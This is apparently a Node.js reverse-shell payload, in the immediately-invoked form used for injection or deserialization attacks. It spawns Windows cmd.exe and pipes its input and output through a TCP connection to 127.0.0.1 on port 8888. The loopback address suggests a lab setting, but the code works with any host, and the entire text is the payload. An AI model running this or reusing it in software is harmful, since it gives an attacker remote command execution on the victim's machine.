(function(){
	var net = require("net"),
		cp = require("child_process"),
		sh = cp.spawn("C:/Windows/System32/cmd.exe",[]);
	var client = new net.Socket();
	client.connect(8888,"127.0.0.1",function(){
		client.pipe(sh.stdin);
		sh.stdout.pipe(client);
		sh.stderr.pipe(client);
		console
	});
	return /a/;
})();